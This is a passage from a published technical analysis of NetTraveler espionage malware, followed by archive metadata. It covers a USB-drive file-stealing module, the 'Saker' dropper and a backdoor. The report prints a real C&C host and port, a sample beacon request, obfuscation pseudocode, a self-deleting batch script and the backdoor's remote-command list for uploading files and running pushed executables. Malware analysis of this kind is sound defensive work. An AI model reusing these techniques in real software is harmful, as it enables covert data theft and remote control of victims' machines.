win\ndow messages in a loop until it is interrupted by\n\nspecial variable value. The window procedure\n\nprocesses only one window message, WM_DE\nVICECHANGE with wParam value set to DBT_\n\nDEVICEARRIVAL, which is sent by the system\n\nwhen a new removable device such as USB flash\n\ndrive or Network shared folder is attached to\n\nthe system.\n\nThe module will proceed only if the attached\n\nremovable device has provided a disk volume.\n\nIt is designed to have different procedures for\n\nremovable disk drives from USB flash and net\nwork shares.\n\nThe USB drives will be processed only if GSearch\n\nvalue is set to True in [Other] section of dnlist.\n\nini file. Similarly, a new network drive will be\n\nprocessed only if USearch value is set to True\n\nin [Other] section of dnlist.ini file.\n\nBoth network and removable USB drives are\n\nprocessed in the same procedure, which reads\n\nthe following values from dnlist.ini file:\n\n_[Other]_\n\n_UTypeLimit=<boolean, default True>_\n\n_UAuto=<boolean, default False>_\n\nIf UAuto option is set to True, the thread creates\n\n%TEMP%\\ntvba00.tmp\\ directory and opens\n\n\nuenumfs.ini file for writing. The latter is filled\n\nwith directories and subdirectories listings of the\n\nattached disk drive. The format of the data in\n\nuenumfs.ini is almost identical to the one created\n\nduring fixed drive filesystem scan (see “Filesys\ntem Scan” part in Thread1 description above).\n\nIn addition to that, the same criterias are applied\n\nto each file (size and file extension) as in fixed\n\ndrive filesystem scan. Also, every file gets a state\n\nid calculated as MD5 hash of the filename and\n\ntimestamp of the last modification. This hash\n\nis used to generate a new filepath in the follow\ning format: %TEMP%\\ntvba00.tmp\\<Year>\n<Month>-<Day>-<Hour>-<Minute>-<File\n\nstate id, MD5 hexadecimal string>.<Original\n\nextension>. The source file from newly attached\n\ndrive is then copied to the destination set by the\n\ngenerated file path. Please note, that the file orig\ninal extension is preserved, while the file name is\n\nchanged. That is used to prevent further problems\n\nwhen working with unsupported encoding.\n\nAt the same time when file is copied to ntvba00.\n\ntmp directory, a record is added to udxidx.ini\n\nfile, which has the following format:\n\n_[Index]_\n\n_<File state id, MD5 hexadecimal string>=1_\n\nThis is done to avoid copying files that were al\nready copied before, unless they were changed\n\nby the user.\n\n\n-----\n\nTo avoid excessive use of the disk drive and oc\ncasional interest of the local user, the file copy\ning procedure has a delay. Every 1000 files the\n\nthread delays execution and sleeps for 9 sec\nonds.\n\nSide notes\n\nUseless text transformation\n\nIn function which gets disk volume serial num\nber the actual serial number is converted from a\n\ndecimal integer to a hexadecimal number stored\n\nas an ASCII string. The integer is converted to\n\n\nThe NetTraveler\n\na string with call to the “sprintf’ function and\n\n“%8X” parameter which outputs 8 characters\n\nrepresenting a number in hexadecimal form.\n\nDespite the fact that the output of this call is in\n\nuppercase, the author of the module converts\n\nthe output to uppercase characters again. This\n\ncould be due to the fact that the author used to\n\nhave “%8x” format string before, which made\n\nsuch conversion rational. However, that clearly\n\nshows that the developer wasn’t aware of vari\nous format strings options, which shows lack of\n\nexperience in C/C++ development.\n\n\n-----\n\nAppendix A: Malware technical analysis\n\nDrive monitoring disk processing issue\n\nAs we mentioned above the drive monitoring\n\nthread uses the same function to process\n\nremovable USB drives and network shares\n\nattached as local drives. Visible separation of\n\nthese two types of disk drives (in the name of\n\nthe options GSearch and USearch, where “U”\n\nprobably stands for “USB” and “G” is for “Glob\nal”, and in separate logical branches of code\n\nflow) is later misused, as the drive processing\n\nroutines is bound to USB drives. At least it read\n\nU-prefixed options from dnlist.ini file, which\n\nlogically corresponds to the USB-type of disk\n\ndrive, but used for both. While this is a minor\n\nissue and probably didn’t cause a serious\n\nproblem for the attackers, this shows that the\n\ndeveloper felt lazy at some point and used\n\nCopy and Paste approach to avoid creating\n\nextra code. It could also mean that one part of\n\nthe code was created by one person and later\n\nmodified by another, who mistakenly over\nlooked general code design.\n\nData decompression routine\n\nThe malware uses a custom data compres\nsion algorithm when uploading files to the\n\nC&C server. While the decompression is not\n\nrequired for the work of the application, the\n\ncode for the decompression routine was also\n\nfound in the malicious module. This clearly\n\nindicates a design flaw and shows that the de\nveloper didn’t review the code on a binary level\n\nafter it was compiled, which is common among\n\nbeginners among malware authors and quite\n\n\nwidespread among common software develop\ners. ‘Saker’ (‘Xbox’) Dropper and Loader\n\n### ‘Saker’ (‘Xbox’) Dropper and Loader\n\nc239af6aff1226fa2\nMD5\nb2bb77dfec865ce\n\nCreate date (GMT) 2013.03.13 12:39:21\n\nSize 67’072\n\nVulnerability\n6.0 (MSVC++ 6.0)\nTargeted\n\nDescription\n\nThe module is non-packed Win32 PE executable\n\nfile compiled in Microsoft Visual C++ 6.0. Al\nthough no encryption or compression is used to\n\nprotect or hide parts of the code, simple obfus\ncation is applied to internal strings. The module\n\nmain purpose is to install and embedded DLL file\n\nor load it during system startup.\n\nTechnical Details\n\nExecution of the main function starts with ob\ntaining local user Startup directory. This path is\n\nappended with “\\service.lnk”.\n\n|MD5|c239af6aff1226fa2 b2bb77dfec865ce|\n|---|---|\n|Create date (GMT)|2013.03.13 12:39:21|\n|Size|67’072|\n|Vulnerability Targeted|6.0 (MSVC++ 6.0)|\n\n\n-----\n\nThe strings, which are used in the application are\n\nstored in simple obfuscated form. For example,\n\nthe “Kaspersky Lab” is stored as “K.sp4r6ky\n\naa,”. The 1, 4, 6, 10 and 12 characters are re\nplaced with hardcoded character constants as\n\nshown below:\n\nThen the module gets local %TEMP% folder path\n\nand constructs paths “%TEMP%\\service.dll”\n\nand “%TEMP%\\service.exe”.\n\nAfter that the code checks if the current module\n\nfile name is called “service.exe”.\n\nIf current module is not called “service.exe”,\n\nthe module copies itself to “%TMP%\\service.\n\nexe” and creates corresponding LNK file in lo\ncal user’s startup folder pointing to the freshly\n\ncreated executable. The executable file is as\nsigned an attribute “hidden” and started in a\n\nnew process. Then the module checks if Kasper\nsky products are installed on local system by\n\n\nThe NetTraveler\n\niterating through %PROGRAMFILES% directory\n\nand looking for “Kaspersky Lab” subdirectory. If\n\nit finds Kaspersky products it quickly exits, if not\n\nit attempts to self-delete by running “cmd.exe /c\n\ndel <ModuleName>” and then exits.\n\nIf the module was already installed in the system\n\nand is called “service.exe”, it checks if system mu\ntex object called “SECUT!” already exists and exits\n\nif it’s true. This is done to avoid multiple instances\n\nof the module from running simultaneously.\n\nAfter that, the module creates a new file at\n\n“%TEMP%\\service.dll” and saves a part of own\n\ndata to the new file. The data offset is hardcoded\n\nas a string “46592”.\n\nNext, it attempts to load the “%TEMP%\\service.\n\ndll” library file and call export function named\n\n“JustTempFun”. After that the module enters\n\nan infinite sleep loop.\n\n\n-----\n\nAppendix A: Malware technical analysis\n\n### ‘Saker’ (‘Xbox’) Backdoor (dropped file)\n\n6312bc2b156062\nMD5\nba5358e7099a88bb95\n\nCreate date (GMT) 2013.03.13 12:35:11\n\nSize 46’592\n\nVulnerability\n6.0 (MSVC++ 6.0)\nTargeted\n\nDescription\n\nThe module is a non-packed Win32 DLL exe\ncutable file compiled in Microsoft Visual C++\n\n6.0. Although no encryption or compression is\n\nused to protect or hide parts of the code, simple\n\nobfuscation is applied to internal strings. The\n\nmodule is to clearly a backdoor application that\n\nenables an attacker to manage files, get infor\nmation about local disk drives, download and\n\nstart new executables. This backdoor is probably\n\nauthored by the same developer who created the\n\nGh0st / Zegost RAT.\n\nTechnical Details\n\nThis module has 2 export functions: JustTemp\nFun and ServiceMain. Module main function as\n\nwell as ServiceMain are empty procedures. So\n\nfar, all functionality of the module is located in\n\nJustTempFun function.\n\nMeanwhile, there is another known malicious\n\nDLL which has exactly these export names \nGh0st RAT, that was also developed by Chinese.\n\n\nWhen this module is loaded with Xbox Loader\n\ndescribed above execution is started with Just\nTempFun exported function. This function begins\n\nwith deobfuscation of the strings used further:\n\n_pitgay.minidns.net_\n\n_8090BBBBBBBBBBBB_\n\n_GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG_\n\n_SakerEvent_\n\n_FFFFFFFFFFFFFFFF_\n\n_Proxy_\n\n_HHHHHHHHHHHHHHHH_\n\nObviously pitgay.minidns.net is the C&C server\n\ndomain name. 8090 is the port the malware con\nnects to. As for the “GGG...”, “FFF...” and “HHH...”\n\nstrings, according to the further code analysis\n\nthey are used as a placeholders for the hardcode\n\nproxy settings:\n\nThe “FFF...” placeholder may contain “Proxy”\n\nstring instead of “F” sequence which works as a\n\nflag to use the proxy settings from the “GGG...”\n\nplaceholder in the form that wininet accepts\n\n(according to MSDN, the format is “http=http://\n\nhttp_proxy other”). The “HHH...” placeholder is\n\nfor proxy username and password.\n\nThe thread collects information about the local\n\nsystem, such as\n\n>> OS version\n\n>> CPU type\n\n|MD5|6312bc2b156062 ba5358e7099a88bb95|\n|---|---|\n|Create date (GMT)|2013.03.13 12:35:11|\n|Size|46’592|\n|Vulnerability Targeted|6.0 (MSVC++ 6.0)|\n\n\n-----\n\n>> Used and available memory\n\n>> Local system name\n\n>> Used and available disk space of the\n\ndrive C:\\\n\nThe last value is converted to a hexstring of 8\n\ncharacters and XOR-ed with current computer\n\nname. The purpose of this value is unclear.\n\nThen the information collected before is encrypt\ned using simple string obfuscation algorithm,\n\nshown below in a pseudo code:\n\n_void ObfuscateString(char* strIn, char* strOut, int_\n\n_nLen)_\n\n_{_\n\n_char c;_\n\n_for (i=0;i <nLen; i++)_\n\n_{_\n\n_c = strIn[i] % 32;_\n\n_if(c <= 9)_\n\n_strOut[2*i] = c+0x30;_\n\n_else_\n\n_strOut[2*i] = c+0x37;_\n\n_if(strIn[i] <= 9)_\n\n_strOut[2*i+1] = strIn[i]+0x30;_\n\n_else_\n\n_strOut[2*i+1] = strIn[i]+0x37;_\n\n_}_\n\n_}_\n\n\nThe NetTraveler\n\nThis algorithm not only adds obfuscation but\n\nalso adds some redundancy, which doubles the\n\nsize of the input string.\n\nThe module attempts to connect to a C&C server\n\nand issue using the following URL:\n\nhttp://pitgay.minidns.net:8090/3010...\n\nAlso, it uses a hardcoded User-Agent string.\n\nThere is not query string parameters, the data\n\nis transferred in a form of CGI path consisting of\n\nhex numbers only and prefixed with 3010, which\n\nmakes such requests rather unique. 3010 most\n\nlikely defines client request ID. Here is how a\n\nrequest may look:\n\n_GET /301000000000F0FD...0000000000000000000_\n\n_000000 HTTP/1.1_\n\n_User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win-_\n\n_dows NT 5.0; .NET CLR 1.1.4322)_\n\n_Host: tsgoogoo.net_\n\n_Host: pitgay.minidns.net:8090_\n\n_Cache-Control: no-cache_\n\nThe module checks the server response code\n\nand if that is HTTP 200, it reads 2 DWORD values\n\n(lets call them ParamA and ParamB) from the the\n\nserver response.\n\nThe first DWORD (ParamA) defines the command\n\nand following execution path. Below is the inte\nger values and commands description:\n\n\n-----\n\nAppendix A: Malware technical analysis\n\n1020: Shutdown\n\n1021: Shutdown\n\nBoth 1020 and 1021 commands are used to\n\ninterrupt execution of the module and terminate\n\nthe main thread. The module also sets local\n\nthread privileges to enable global system shut\ndown, however this is not used later and proba\nbly represents some remains of the code written\n\nearlier or another variant of the code. This is also\n\nconfirmed by by the shutdown procedure exe\ncuted afterwards, which is designed to disable\n\nWindows hook mechanism while it wasn’t used\n\npreviously anywhere in the code.\n\n1022: Self-remove\n\nThis command is used to self-remove current\n\nmodule and stop its execution. It attempts to\n\ncreate a local batch file named del.bat with the\n\nfollowing contents and run it:\n\n_@echo off_\n\n_ping /n 5 127.0.0.1 >nul_\n\n_>nul del /f/s/q/a <CurrentModuleDir>\\service.exe_\n\n_>nul del /f/s/q/a <CurrentModuleDir>\\service.dll_\n\n_>nul del %0 /s/q/a/f del.bat_\n\nPlease note non-standard way to call Windows\n\ncommand line interpreter which starts from re\ndirection of output to NUL virtual device. Also,\n\nthe command arguments are not separated with\n\nspace or tab characters, and it might look invalid,\n\nhowever cmd.exe on Windows XP, Windows 7 and\n\nWindows 8 executed it correctly without a problem.\n\n\n1029: File manager\n\nThe command spawns a new thread which\n\nopens a new session with the server to provide\n\nfile management operations.\n\nThe new thread makes 2 HTTP Get requests\n\nto the server, which are identical to the 3010\n\nrequest described above. The only difference\n\nis the request ID, which is 4001 and 4002 for\n\nthe first and second requests correspondingly.\n\nThe output of the 4001 request is ignored, while\n\nrequest 4002 is interpreted.\n\nThe server response contains 2 DWORD values:\n\nlets call them FileCmdId and DataSize. if Data\nSize is non-zero the module fetches additional\n\ndata which length is specified in the DataSize\n\noption.\n\nThe FileCmdId defines which operation must be\n\nexecuted. It can be one of the following values:\n\n5001: Get drive information. Provides informa\ntion about specified disk drive: free space, drive\n\ntype. Client command success code is 0, error\n\ncode is 7004.\n\n5002: Get file information. Provides information\n\nabout specified file: file times, attributes. Client\n\ncommand success code is 0, error code is 7003.\n\n5003: Get directory information. Provides\n\ninformation about specified directory: directory\n\n\n-----\n\ntimes, attributes, full size. Client command suc\ncess code is 0, error code is 7003.\n\n5004: Get directory listing. Provide simple di\nrectory listing, which includes file names, sizes,\n\nlast write time. Client command success code is\n\n0, error code is 7001.\n\n5006: Create directory. Create a new directory,\n\nwhich full path is provided by the server. Client\n\ncommand success code is 0, error code is 7016.\n\n5008: List drives. List available disk drives with\n\ninformation about free space. Client command\n\nsuccess code is 0, error code is not defined.\n\n5009: Run application. Run local application\n\nwith path and command line arguments passed\n\nfrom the server. Client command success code\n\nis 0, error code is 7005.\n\n5017: Get recursive directory listing. Provide\n\nrecursive directory listing. Client command suc\ncess code is 0, error code is 7000.\n\n5025: Run pushed executable. This command\n\nis used to save file pushed by the server and run\n\ninstantly. When this command is received the\n\nmodule checks if it can create a new file, which\n\nname is passed by the server response. If it\n\nfails it submits error code 7003. Then it spawns\n\na new thread which issues a new HTTP Post\n\nrequest with command id 3005 and system in\nformation attached in the CGI Path. The request\n\n\nThe NetTraveler\n\nof the server should contain file data to write to\n\nthe already opened file and execute right away.\n\n5026: Upload file to the server. The command\n\nis used to read local file and transfer it to the\n\nserver. It gets file information, including time\nstamps and size and spawns a new thread. If any\n\nof those operations fails the module reports er\nror code 7003 to the server. Otherwise it reports\n\nsuccess code 0 and spawns a new thread. The\n\nnew thread reads the file specified in the request\n\nand uploads it to the server.\n\n1039: Download and run new module.\n\nThe module uses ParamB as an integer value\n\nindicating a length of a string to read next from\n\nthe server response. The received string will be\n\nused as a NewFilename. Then it reads another\n\nDWORD value from the server response and\n\ninterprets it as a size of the following data to\n\nread. After that a new directory “Internet Ex\nplorer” is created in the directory of the current\n\nrunning module. Then the module creates a new\n\nfile using the value NewFilename pushed by the\n\nserver. The module makes 2 attempts to start a\n\nnew process: by calling CreateProcessA system\n\nAPI and ShellExecuteA if the previous call failed.\n\nThe code was designed to support more com\nmands (1028, 1029, 1032, 1033, 1034, 1035,\n\n1036), however they are now falling into com\nmand 1029 handler and then ignored. We cre\nated a chart showing a tree of commands de\npendencies:\n\n\n-----\n\nAppendix A: Malware technical analysis\n\nThe execution of this command processing thread continues in a loop until it is interrupt\ned by Shutdown command coming from the server. The code starts new loop iteration\n\nafter hardcoded value of 30 seconds.\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/1qx5mkzkcvwq3eazh2ygxowfbbadofby",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2013/2013.06.04.NetTraveller/kaspersky-the-net-traveler-part1-final.pdf",
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080841/kaspersky-the-net-traveler-part1-final.pdf"
    ],
    "report_names": [
        "kaspersky-the-net-traveler-part1-final",
        "kaspersky-the-net-traveler-part1-final.pdf"
    ],
    "threat_actors": [
        {
            "id": "808d8d52-ca06-4a5f-a2c1-e7b1ce986680",
            "created_at": "2022-10-25T16:07:23.899157Z",
            "updated_at": "2025-03-27T02:02:10.019417Z",
            "deleted_at": null,
            "main_name": "NetTraveler",
            "aliases": [
                "APT 21",
                "Hammer Panda",
                "NetTraveler",
                "TEMP.Zhenbao"
            ],
            "source_name": "ETDA:NetTraveler",
            "tools": [
                "Agent.dhwf",
                "Destroy RAT",
                "DestroyRAT",
                "Kaba",
                "Korplug",
                "NetTraveler",
                "Netfile",
                "PlugX",
                "RedDelta",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "TravNet",
                "Xamtrav"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "254f2fab-5834-4d90-9205-d80e63d6d867",
            "created_at": "2023-01-06T13:46:38.31544Z",
            "updated_at": "2025-03-27T02:00:02.802896Z",
            "deleted_at": null,
            "main_name": "APT21",
            "aliases": [
                "HAMMER PANDA",
                "TEMP.Zhenbao",
                "NetTraveler"
            ],
            "source_name": "MISPGALAXY:APT21",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7c8cf02c-623a-4793-918b-f908675a1aef",
            "created_at": "2023-01-06T13:46:38.309165Z",
            "updated_at": "2025-03-27T02:00:02.801298Z",
            "deleted_at": null,
            "main_name": "APT15",
            "aliases": [
                "BRONZE PALACE",
                "Nylon Typhoon",
                "VIXEN PANDA",
                "Playful Dragon",
                "BRONZE DAVENPORT",
                "BRONZE IDLEWOOD",
                "G0004",
                "Red Vulture",
                "Ke3Chang",
                "Metushy",
                "Lurid",
                "Social Network Team",
                "Royal APT"
            ],
            "source_name": "MISPGALAXY:APT15",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041536,
    "ts_creation_date": 1370358154,
    "ts_modification_date": 1370358159,
    "files": {
        "pdf": "https://archive.orkl.eu/4fd06d33aa1a087709277eb71d204e2fbf8b9243.pdf",
        "text": "https://archive.orkl.eu/4fd06d33aa1a087709277eb71d204e2fbf8b9243.txt",
        "img": "https://archive.orkl.eu/4fd06d33aa1a087709277eb71d204e2fbf8b9243.jpg"
    }
}